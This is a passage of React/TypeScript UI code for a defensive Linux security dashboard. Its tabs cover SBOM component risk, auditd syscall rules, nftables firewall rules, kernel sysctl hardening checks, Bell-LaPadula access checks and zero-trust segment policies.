                <Bdg label={v.cveId} color="#4488ff" sm/><Bdg label={v.severity.toUpperCase()} color={SEV_COLOR[v.severity]??"#888"} sm/><span style={{color:"#888",fontSize:10}}>CVSS {v.cvssScore}</span>
              </div>
            ))}
          </div>
        )}
        <div style={{ marginTop:12 }}>
          <div style={{ fontSize:10, color:"#444", marginBottom:6 }}>NSA SBOM Requirements</div>
          {(stats?.nsaRequirements??[]).map(r=><div key={r} style={{ fontSize:9, color:"#555", marginBottom:2, fontFamily:"monospace" }}>• {r}</div>)}
        </div>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<AlertTriangle size={12} color="#ff4444"/>} title="Component Risk Table"/>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:10 }}>
          <thead><tr>{["Package","Ecosystem","CVEs","Risk"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"3px 6px",fontFamily:"monospace"}}>{h}</th>)}</tr></thead>
          <tbody>{(comps?.components??[]).slice(0,12).map(c=>(
            <tr key={c.id}>
              <td style={{padding:"3px 6px",fontFamily:"monospace",color:"#fff"}}>{c.name}<span style={{color:"#555"}}> @{c.version}</span></td>
              <td style={{padding:"3px 6px",color:"#4488ff"}}>{c.ecosystem}</td>
              <td style={{padding:"3px 6px",color:c.cveCount>0?"#ff6600":"#00ff88",fontFamily:"monospace"}}>{c.cveCount}</td>
              <td style={{padding:"3px 6px"}}><span style={{color:RISK_C(c.riskScore),fontFamily:"monospace",fontWeight:700}}>{c.riskScore}</span></td>
            </tr>
          ))}</tbody>
        </table>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 4. auditd SYSCALL AUDITING ────────────────────════════════════════════
// ════════════════════════════════════════════════════════════════════════════
function AuditdTab() {
  const { data: rulesData, reload } = useFwm<{ rules:Array<{id:number;ruleText:string;ruleType:string;syscall:string|null;action:string;key:string|null;arch:string;priority:number;enabled:boolean}>;liveRules:string[] }>("/auditd/rules");
  const { data: evtsData } = useFwm<{ events:Array<{id:number;type:string;syscall:string|null;pid:number|null;uid:number|null;comm:string|null;exe:string|null;key:string|null;success:boolean|null;severity:string;detectedAt:string}>;total:number }>("/auditd/events");
  const [rawMsg, setRawMsg] = useState("");
  const [parseResult, setParseResult] = useState<{event:{type:string;severity:string};parsed:Record<string,unknown>}|null>(null);
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Microscope size={14} color="#ff9900"/>} title="auditd — Kernel Syscall Auditing" badge="DARPA Concern" badgeColor="#ff6600" extra={<Btn2 onClick={async()=>{await fwmPost("/auditd/seed",{}); await reload();}} color="#4488ff" sm>Seed Rules</Btn2>}/>
        <InfoBar text="Linux auditd: defense-grade syscall-level auditing. DARPA concern: Linux kernel is the core building block of virtually all cloud computing. Tracks execve, setuid, ptrace, module loads, file writes, auth events. Key STIG categories: exec_tracking, privilege_escalation, identity, modules." color="#ff9900"/>
        <div style={{ display:"flex", gap:8, flexWrap:"wrap" }}>
          {(rulesData?.liveRules??[]).slice(0,4).map((r,i)=><div key={i} style={{ background:"#111", borderRadius:5, padding:"4px 10px", fontFamily:"monospace", fontSize:9, color:"#ffaa00" }}>{r}</div>)}
        </div>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<ShieldCheck size={12} color="#ff9900"/>} title="Audit Rules" sub={`${rulesData?.rules?.length??0} configured`}/>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:9 }}>
          <thead><tr>{["Syscall","Action","Key","Arch","Pri"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"3px 6px",fontFamily:"monospace"}}>{h}</th>)}</tr></thead>
          <tbody>{(rulesData?.rules??[]).map(r=>(
            <tr key={r.id}>
              <td style={{padding:"3px 6px",fontFamily:"monospace",color:"#ffaa00"}}>{r.syscall ?? r.ruleType}</td>
              <td style={{padding:"3px 6px",color:"#555"}}>{r.action}</td>
              <td style={{padding:"3px 6px",color:"#4488ff"}}>{r.key}</td>
              <td style={{padding:"3px 6px",color:"#555"}}>{r.arch}</td>
              <td style={{padding:"3px 6px",color:"#555"}}>{r.priority}</td>
            </tr>
          ))}</tbody>
        </table>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<AlertTriangle size={12} color="#ff4444"/>} title="Audit Event Log"/>
        <div style={{ display:"flex", gap:8, marginBottom:10 }}>
          <textarea value={rawMsg} onChange={e=>setRawMsg(e.target.value)} placeholder="Paste raw audit log line to parse..." style={{ flex:1, background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:8, fontFamily:"monospace", fontSize:9, color:"#ccc", minHeight:60, resize:"vertical" }}/>
        </div>
        <Btn2 onClick={async()=>{ const r = await fwmPost("/auditd/parse",{rawMessage:rawMsg}); setParseResult(r); }} color="#ff9900" sm disabled={!rawMsg}>Parse Log Line</Btn2>
        {parseResult && (
          <div style={{ marginTop:8, background:"#0a0500", border:"1px solid #ff990022", borderRadius:6, padding:8, fontFamily:"monospace", fontSize:9 }}>
            <div style={{ display:"flex", gap:8, marginBottom:6 }}>
              <Bdg label={parseResult.event.type} color="#ffaa00" sm/><Bdg label={parseResult.event.severity.toUpperCase()} color={SEV_COLOR[parseResult.event.severity]??"#888"} sm/>
            </div>
            {Object.entries(parseResult.parsed).filter(([,v])=>v!==null).map(([k,v])=>(
              <div key={k} style={{ display:"flex", gap:8, marginBottom:1 }}><span style={{color:"#444",minWidth:60}}>{k}:</span><span style={{color:"#ccc"}}>{String(v)}</span></div>
            ))}
          </div>
        )}
        <div style={{ marginTop:10 }}>
          {(evtsData?.events??[]).slice(0,6).map(e=>(
            <div key={e.id} style={{ background: e.severity==="critical"?"#0f0505":e.severity==="high"?"#0a0500":"#0a0a0a", border:`1px solid ${SEV_COLOR[e.severity]??"#888"}22`, borderRadius:5, padding:7, marginBottom:5, fontFamily:"monospace", fontSize:9 }}>
              <div style={{ display:"flex", justifyContent:"space-between" }}>
                <span style={{ color:SEV_COLOR[e.severity]??"#888" }}>{e.type} · {e.syscall ?? "WATCH"}</span>
                <Bdg label={e.severity.toUpperCase()} color={SEV_COLOR[e.severity]??"#888"} sm/>
              </div>
              <div style={{ color:"#555" }}>pid={e.pid} uid={e.uid} comm={e.comm} key={e.key}</div>
            </div>
          ))}
        </div>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 5. nftables RULE ENGINE ────────────────────════════════════════════════
// ════════════════════════════════════════════════════════════════════════════
function NftablesTab() {
  const { data, loading, reload } = useFwm<{ rules:Array<{id:number;table:string;chain:string;priority:number;matchSrcIp:string|null;matchDstIp:string|null;matchSrcPort:number|null;matchDstPort:number|null;matchProto:string|null;setName:string|null;action:string;comment:string|null;enabled:boolean;pktCount:number;byteCount:number}>;sets:Array<{id:number;name:string;type:string;flags:string|null;elements:string[]|null;comment:string|null}>;liveOutput:string }>("/nftables/rules");
  const [form, setForm] = useState({ chain:"input", action:"drop", matchDstPort:"", matchProto:"tcp", comment:"" });
  const add = async () => { await fwmPost("/nftables/rules",{...form, matchDstPort:form.matchDstPort?parseInt(form.matchDstPort):undefined}); await reload(); };
  const exportRules = async () => { const r = await fetch(`${APIFWM}/nftables/export`); const t = await r.text(); const b=new Blob([t],{type:"text/plain"}); const a=document.createElement("a"); a.href=URL.createObjectURL(b); a.download="proxhq-nftables.nft"; a.click(); };
  const CHAIN_C: Record<string,string> = { input:"#4488ff", output:"#00ff88", forward:"#ff9900", prerouting:"#cc44ff", postrouting:"#44ddff" };
  const ACT_C:   Record<string,string> = { accept:"#00ff88", drop:"#ff4444", reject:"#ff6600", log:"#ffaa00", masquerade:"#44aaff", counter:"#888" };
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<HardDrive size={14} color="#44aaff"/>} title="nftables Rule Engine — Linux NGFW" badge="iptables replacement" badgeColor="#44aaff" extra={<div style={{display:"flex",gap:6}}><Btn2 onClick={async()=>{await fwmPost("/nftables/seed",{}); await reload();}} color="#4488ff" sm>Seed Rules</Btn2><Btn2 onClick={exportRules} color="#00ff88" sm>Export .nft</Btn2></div>}/>
        <InfoBar text="nftables — modern iptables replacement (Linux 3.13+). Atomic rule updates, named sets, maps, dictionaries. Better performance, single tool replaces iptables/ip6tables/arptables/ebtables. Syntax: nft add rule inet filter input tcp dport 22 accept" color="#44aaff"/>
        {data?.liveOutput && <div style={{ background:"#050a0f", border:"1px solid #44aaff22", borderRadius:6, padding:8, fontFamily:"monospace", fontSize:8, color:"#557", maxHeight:80, overflow:"auto", marginBottom:10 }}>{data.liveOutput}</div>}
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<Plus size={12} color="#00ff88"/>} title="Add nftables Rule"/>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:8, marginBottom:8 }}>
          <select value={form.chain} onChange={e=>setForm(p=>({...p,chain:e.target.value}))} style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}>
            {["input","output","forward","prerouting","postrouting"].map(c=><option key={c}>{c}</option>)}
          </select>
          <select value={form.action} onChange={e=>setForm(p=>({...p,action:e.target.value}))} style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}>
            {["accept","drop","reject","log","masquerade","counter"].map(a=><option key={a}>{a}</option>)}
          </select>
          <input value={form.matchDstPort} onChange={e=>setForm(p=>({...p,matchDstPort:e.target.value}))} placeholder="dst port (e.g. 22)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <select value={form.matchProto} onChange={e=>setForm(p=>({...p,matchProto:e.target.value}))} style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}>
            {["tcp","udp","icmp","any"].map(p=><option key={p}>{p}</option>)}
          </select>
        </div>
        <input value={form.comment} onChange={e=>setForm(p=>({...p,comment:e.target.value}))} placeholder="Comment (optional)" style={{ width:"100%", background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc", boxSizing:"border-box", marginBottom:8 }}/>
        <Btn2 onClick={add} color="#00ff88" sm>Add Rule</Btn2>
        <div style={{ marginTop:12 }}>
          <div style={{ fontSize:10, color:"#444", marginBottom:6 }}>Named Sets ({data?.sets?.length??0})</div>
          {(data?.sets??[]).map(s=><div key={s.id} style={{ background:"#111", borderRadius:5, padding:"5px 10px", marginBottom:4, display:"flex", justifyContent:"space-between" }}><span style={{ fontFamily:"monospace", color:"#44aaff", fontSize:10 }}>{s.name}</span><span style={{ color:"#555", fontSize:9 }}>{s.type}</span></div>)}
        </div>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<HardDrive size={12} color="#44aaff"/>} title="Rules" sub={`${data?.rules?.length??0} configured`}/>
        {loading ? <div style={{color:"#444",fontSize:11}}>Loading...</div> : (
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:9 }}>
            <thead><tr>{["Chain","Port/Proto","Action","Pkts","Comment"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"3px 6px"}}>{h}</th>)}</tr></thead>
            <tbody>{(data?.rules??[]).map(r=>(
              <tr key={r.id}>
                <td style={{padding:"3px 6px"}}><Bdg label={r.chain.toUpperCase()} color={CHAIN_C[r.chain]??"#888"} sm/></td>
                <td style={{padding:"3px 6px",fontFamily:"monospace",color:"#aaa"}}>{r.matchDstPort ?? r.setName ?? "*"}{r.matchProto?`/${r.matchProto}`:""}</td>
                <td style={{padding:"3px 6px"}}><Bdg label={r.action.toUpperCase()} color={ACT_C[r.action]??"#888"} sm/></td>
                <td style={{padding:"3px 6px",color:"#555",fontFamily:"monospace"}}>{r.pktCount}</td>
                <td style={{padding:"3px 6px",color:"#444",fontSize:9}}>{r.comment}</td>
              </tr>
            ))}</tbody>
          </table>
        )}
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 6. KERNEL HARDENING MONITOR ───────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function KernelHardenTab() {
  const { data, loading, reload } = useFwm<{ checks:Array<{id:number;paramPath:string;paramName:string;currentValue:string|null;recommendedValue:string;status:string;category:string;description:string;mitigation:string;cve:string|null}>;score:number;secure:number;warning:number;critical:number }>("/kernel/hardening");
  const downloadScript = async () => { const r = await fetch(`${APIFWM}/kernel/hardening/script`); const t = await r.text(); const b=new Blob([t],{type:"text/plain"}); const a=document.createElement("a"); a.href=URL.createObjectURL(b); a.download="kernel-harden.sh"; a.click(); };
  const S_C: Record<string,string> = { secure:"#00ff88", warning:"#ffaa00", critical:"#ff4444", unknown:"#555" };
  const CAT_C: Record<string,string> = { kernel:"#cc44ff", net:"#4488ff", fs:"#ff9900", vm:"#44aaff", user:"#ff6600" };
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<ShieldCheck size={14} color="#cc44ff"/>} title="Kernel Hardening Monitor — NSA/DARPA" badge="Live /proc/sys" badgeColor="#cc44ff" extra={<div style={{display:"flex",gap:6}}><Btn2 onClick={()=>reload()} color="#ff9900" sm>Re-Scan Live</Btn2><Btn2 onClick={downloadScript} color="#00ff88" sm>Download .sh Script</Btn2></div>}/>
        <InfoBar text="DARPA 2024: Linux kernel is the core building block of virtually all cloud computing. Checks 15 critical sysctl parameters: ASLR, dmesg_restrict, kptr_restrict, ptrace_scope, user namespaces, SYN cookies, SUID dumps, symlink/hardlink protection, mmap_min_addr. All values read from live /proc/sys." color="#cc44ff"/>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:10 }}>
          {[{l:"Hardening Score",v:`${data?.score??0}%`,c: (data?.score??0)>=80?"#00ff88":(data?.score??0)>=50?"#ffaa00":"#ff4444"},{l:"Secure",v:data?.secure??0,c:"#00ff88"},{l:"Warnings",v:data?.warning??0,c:"#ffaa00"},{l:"Critical",v:data?.critical??0,c:"#ff4444"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"10px 6px" }}>
              <div style={{ fontSize:22, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
              <div style={{ fontSize:10, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>
      </FwmCard>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        {loading ? <div style={{color:"#444",fontFamily:"monospace"}}>Scanning live kernel parameters...</div> : (
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:10 }}>
            <thead><tr>{["Parameter","Category","Current","Recommended","Status","CVE"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"4px 8px",fontFamily:"monospace"}}>{h}</th>)}</tr></thead>
            <tbody>{(data?.checks??[]).map(c=>(
              <tr key={c.id} style={{ borderBottom:"1px solid #111" }}>
                <td style={{padding:"5px 8px"}}>
                  <div style={{ fontFamily:"monospace", color:"#ccc", fontSize:10 }}>{c.paramName}</div>
                  <div style={{ fontSize:8, color:"#444" }}>{c.description.slice(0,60)}</div>
                </td>
                <td style={{padding:"5px 8px"}}><Bdg label={c.category} color={CAT_C[c.category]??"#888"} sm/></td>
                <td style={{padding:"5px 8px",fontFamily:"monospace",color:c.status==="secure"?"#00ff88":c.status==="critical"?"#ff4444":"#ffaa00",fontSize:11,fontWeight:700}}>{c.currentValue ?? "N/A"}</td>
                <td style={{padding:"5px 8px",fontFamily:"monospace",color:"#555"}}>{c.recommendedValue}</td>
                <td style={{padding:"5px 8px"}}><Bdg label={c.status.toUpperCase()} color={S_C[c.status]??"#888"} sm/></td>
                <td style={{padding:"5px 8px",fontFamily:"monospace",fontSize:9,color:"#ff6600"}}>{c.cve}</td>
              </tr>
            ))}</tbody>
          </table>
        )}
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 7. MLS / BELL-LaPADULA ─────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function MlsTab() {
  const { data, reload } = useFwm<{ policies:Array<{id:number;subjectLabel:string;objectLabel:string;subjectLevel:string;objectLevel:string;canRead:boolean;canWrite:boolean;canExecute:boolean;bellLapadura:boolean;description:string|null}>;model:Record<string,unknown> }>("/mls/policies");
  const [checkForm, setCheckForm] = useState({ subjectLabel:"", objectLabel:"", subjectLevel:"unclassified", objectLevel:"confidential", operation:"read" });
  const [checkResult, setCheckResult] = useState<{allowed:boolean;reason:string;operation:string}|null>(null);
  const LEVELS = ["unclassified","confidential","secret","top_secret","sci"];
  const LVL_C: Record<string,string> = { unclassified:"#555", confidential:"#4488ff", secret:"#ff9900", top_secret:"#ff4444", sci:"#cc44ff" };
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<BookOpen size={14} color="#cc44ff"/>} title="MLS / Bell-LaPadula Classification Engine" badge="DoD / NSA SELinux MLS" badgeColor="#cc44ff" extra={<Btn2 onClick={async()=>{await fwmPost("/mls/seed",{}); await reload();}} color="#4488ff" sm>Seed Policies</Btn2>}/>
        <InfoBar text="Bell-LaPadula (1973) — the mathematical foundation of US military information security. No-Read-Up (Simple Security): S can read O iff level(S) ≥ level(O). No-Write-Down (★-Property): S can write O iff level(S) ≤ level(O). Prevents downgrading classified data. Used in: NSA SELinux MLS policy, DoD DIACAP, NSA Type 1 encryption." color="#cc44ff"/>
        <div style={{ display:"flex", gap:8, flexWrap:"wrap" }}>
          {LEVELS.map(l=><div key={l} style={{ background:`${LVL_C[l]}22`, border:`1px solid ${LVL_C[l]}44`, borderRadius:6, padding:"4px 12px", fontFamily:"monospace", fontSize:10, color:LVL_C[l], textTransform:"uppercase", letterSpacing:2 }}>{l.replace(/_/g," ")}</div>)}
        </div>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<ShieldCheck size={12} color="#cc44ff"/>} title="BLP Access Check"/>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:8, marginBottom:8 }}>
          <input value={checkForm.subjectLabel} onChange={e=>setCheckForm(p=>({...p,subjectLabel:e.target.value}))} placeholder="Subject (e.g. analyst_alice)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <input value={checkForm.objectLabel} onChange={e=>setCheckForm(p=>({...p,objectLabel:e.target.value}))} placeholder="Object (e.g. classified_docs)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <select value={checkForm.subjectLevel} onChange={e=>setCheckForm(p=>({...p,subjectLevel:e.target.value}))} style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}>
            {LEVELS.map(l=><option key={l} value={l}>{l.replace(/_/g," ").toUpperCase()}</option>)}
          </select>
          <select value={checkForm.objectLevel} onChange={e=>setCheckForm(p=>({...p,objectLevel:e.target.value}))} style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}>
            {LEVELS.map(l=><option key={l} value={l}>{l.replace(/_/g," ").toUpperCase()}</option>)}
          </select>
        </div>
        <div style={{ display:"flex", gap:8, marginBottom:10 }}>
          {["read","write","execute"].map(op=>(
            <button key={op} onClick={()=>setCheckForm(p=>({...p,operation:op}))} style={{ flex:1, background:checkForm.operation===op?"#cc44ff22":"#111", border:`1px solid ${checkForm.operation===op?"#cc44ff44":"#2a2a2a"}`, borderRadius:6, padding:"5px", fontFamily:"monospace", fontSize:10, color:checkForm.operation===op?"#cc44ff":"#555", cursor:"pointer" }}>{op.toUpperCase()}</button>
          ))}
        </div>
        <Btn2 onClick={async()=>{ const r = await fwmPost("/mls/check",checkForm); setCheckResult(r); await reload(); }} color="#cc44ff" sm disabled={!checkForm.subjectLabel||!checkForm.objectLabel}>Run BLP Check</Btn2>
        {checkResult && (
          <div style={{ marginTop:10, background: checkResult.allowed?"#050f05":"#0f0505", border:`1px solid ${checkResult.allowed?"#00ff8833":"#ff444433"}`, borderRadius:6, padding:10, fontFamily:"monospace", fontSize:11 }}>
            <div style={{ fontSize:18, fontWeight:700, color:checkResult.allowed?"#00ff88":"#ff4444", marginBottom:6 }}>{checkResult.allowed?"✅ ALLOWED":"🚫 DENIED"}</div>
            <div style={{ fontSize:10, color:"#aaa" }}>{checkResult.reason}</div>
          </div>
        )}
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<BookOpen size={12} color="#cc44ff"/>} title="Policies ({data?.policies?.length??0})"/>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:9 }}>
          <thead><tr>{["Subject","Object","S.Level","O.Level","R/W/X","BLP"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"3px 6px"}}>{h}</th>)}</tr></thead>
          <tbody>{(data?.policies??[]).map(p=>(
            <tr key={p.id} style={{ borderBottom:"1px solid #0f0f0f" }}>
              <td style={{padding:"3px 6px",color:"#aaa",fontFamily:"monospace"}}>{p.subjectLabel}</td>
              <td style={{padding:"3px 6px",color:"#555",fontFamily:"monospace"}}>{p.objectLabel}</td>
              <td style={{padding:"3px 6px"}}><span style={{color:LVL_C[p.subjectLevel]??"#888",fontFamily:"monospace",fontSize:9}}>{p.subjectLevel.replace(/_/g," ")}</span></td>
              <td style={{padding:"3px 6px"}}><span style={{color:LVL_C[p.objectLevel]??"#888",fontFamily:"monospace",fontSize:9}}>{p.objectLevel.replace(/_/g," ")}</span></td>
              <td style={{padding:"3px 6px",fontFamily:"monospace",color:"#555"}}>{p.canRead?"R":"·"}{p.canWrite?"W":"·"}{p.canExecute?"X":"·"}</td>
              <td style={{padding:"3px 6px"}}><Bdg label={p.bellLapadura?"BLP":"OFF"} color={p.bellLapadura?"#cc44ff":"#333"} sm/></td>
            </tr>
          ))}</tbody>
        </table>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 8. ZERO TRUST MICROSEGMENTATION ──────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function ZeroTrustTab() {
  const { data, reload } = useFwm<{ segments:Array<{id:number;name:string;srcLabel:string;dstLabel:string;ports:number[]|null;protocols:string[]|null;action:string;mTls:boolean;jwtRequired:boolean;enabled:boolean;violationCount:number;description:string|null}>;total:number;allowed:number;denied:number }>("/zt/segments");
  const [form, setForm] = useState({ name:"", srcLabel:"", dstLabel:"", action:"deny", mTls:true, jwtRequired:true, description:"" });
  const [verifyForm, setVerifyForm] = useState({ srcLabel:"", dstLabel:"", port:"" });
  const [verifyResult, setVerifyResult] = useState<{allowed:boolean;reason:string}|null>(null);
  const ACT_C: Record<string,string> = { allow:"#00ff88", deny:"#ff4444", inspect:"#ffaa00", alert:"#ff9900" };
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Key size={14} color="#44aaff"/>} title="Zero Trust Microsegmentation — CISA 2025" badge="NIST SP 800-207" badgeColor="#44aaff" extra={<Btn2 onClick={async()=>{await fwmPost("/zt/seed",{}); await reload();}} color="#4488ff" sm>Seed Segments</Btn2>}/>
        <InfoBar text="CISA Zero Trust Maturity Model 2025 / NIST SP 800-207. Never Trust, Always Verify. Default-deny all inter-workload traffic. mTLS between all segments (cryptographic identity). JWT/SPIFFE/SVID workload auth. Generates Cilium NetworkPolicy (Kubernetes) equivalent configs." color="#44aaff"/>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:10 }}>
          {[{l:"Segments",v:data?.total??0,c:"#fff"},{l:"Allow",v:data?.allowed??0,c:"#00ff88"},{l:"Deny",v:data?.denied??0,c:"#ff4444"},{l:"mTLS Required",v:(data?.segments??[]).filter(s=>s.mTls).length,c:"#44aaff"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"10px 6px" }}>
              <div style={{ fontSize:20, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
              <div style={{ fontSize:10, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<ShieldCheck size={12} color="#44aaff"/>} title="Policy Segments"/>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:9 }}>
          <thead><tr>{["Src","Dst","Ports","Action","mTLS","JWT","Violations"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"3px 6px"}}>{h}</th>)}</tr></thead>
          <tbody>{(data?.segments??[]).map(s=>(
            <tr key={s.id} style={{ borderBottom:"1px solid #0f0f0f" }}>
              <td style={{padding:"3px 6px",fontFamily:"monospace",color:"#4488ff",fontSize:9}}>{s.srcLabel}</td>
              <td style={{padding:"3px 6px",fontFamily:"monospace",color:"#aaa",fontSize:9}}>{s.dstLabel}</td>
              <td style={{padding:"3px 6px",color:"#555",fontSize:9}}>{(s.ports??[]).join(",") || "any"}</td>
              <td style={{padding:"3px 6px"}}><Bdg label={s.action.toUpperCase()} color={ACT_C[s.action]??"#888"} sm/></td>
              <td style={{padding:"3px 6px"}}><Bdg label={s.mTls?"YES":"NO"} color={s.mTls?"#00ff88":"#555"} sm/></td>
              <td style={{padding:"3px 6px"}}><Bdg label={s.jwtRequired?"YES":"NO"} color={s.jwtRequired?"#00ff88":"#555"} sm/></td>
              <td style={{padding:"3px 6px",color:s.violationCount>0?"#ff4444":"#555",fontFamily:"monospace"}}>{s.violationCount}</td>
            </tr>
          ))}</tbody>
        </table>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<Search size={12} color="#44aaff"/>} title="Policy Verify"/>
        <div style={{ display:"flex", flexDirection:"column", gap:8, marginBottom:8 }}>
          <input value={verifyForm.srcLabel} onChange={e=>setVerifyForm(p=>({...p,srcLabel:e.target.value}))} placeholder="Source label (e.g. web-frontend)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <input value={verifyForm.dstLabel} onChange={e=>setVerifyForm(p=>({...p,dstLabel:e.target.value}))} placeholder="Dest label (e.g. postgres)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <input value={verifyForm.port} onChange={e=>setVerifyForm(p=>({...p,port:e.target.value}))} placeholder="Port (optional)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
        </div>
        <Btn2 onClick={async()=>{ const r = await fwmPost("/zt/verify",{srcLabel:verifyForm.srcLabel,dstLabel:verifyForm.dstLabel,port:verifyForm.port?parseInt(verifyForm.port):undefined}); setVerifyResult(r); }} color="#44aaff" sm>Verify Policy</Btn2>
        {verifyResult && (
          <div style={{ marginTop:10, background: verifyResult.allowed?"#050f05":"#0f0505", border:`1px solid ${verifyResult.allowed?"#00ff8833":"#ff444433"}`, borderRadius:6, padding:10 }}>
            <div style={{ fontSize:16, fontWeight:700, fontFamily:"monospace", color:verifyResult.allowed?"#00ff88":"#ff4444", marginBottom:6 }}>{verifyResult.allowed?"✅ ALLOWED":"🚫 DENIED (Default-Deny)"}</div>
            <div style={{ fontSize:10, color:"#aaa" }}>{verifyResult.reason}</div>
          </div>
        )}
        <div style={{ marginTop:14 }}>
          <div style={{ fontSize:10, color:"#444", marginBottom:8 }}>Add Segment</div>
          <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:6, marginBottom:6 }}>
            <input value={form.name} onChange={e=>setForm(p=>({...p,name:e.target.value}))} placeholder="Policy name" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"5px 8px", fontFamily:"monospace", fontSize:9, color:"#ccc" }}/>
            <select value={form.action} onChange={e=>setForm(p=>({...p,action:e.target.value}))} style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"5px 8px", fontFamily:"monospace", fontSize:9, color:"#ccc" }}>
              {["allow","deny","inspect","alert"].map(a=><option key={a}>{a}</option>)}
            </select>
            <input value={form.srcLabel} onChange={e=>setForm(p=>({...p,srcLabel:e.target.value}))} placeholder="Source label" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"5px 8px", fontFamily:"monospace", fontSize:9, color:"#ccc" }}/>
            <input value={form.dstLabel} onChange={e=>setForm(p=>({...p,dstLabel:e.target.value}))} placeholder="Dest label" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"5px 8px", fontFamily:"monospace", fontSize:9, color:"#ccc" }}/>
          </div>
          <Btn2 onClick={async()=>{ await fwmPost("/zt/segments",form); await reload(); }} color="#00ff88" sm disabled={!form.name||!form.srcLabel||!form.dstLabel}>Add Segment</Btn2>
        </div>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
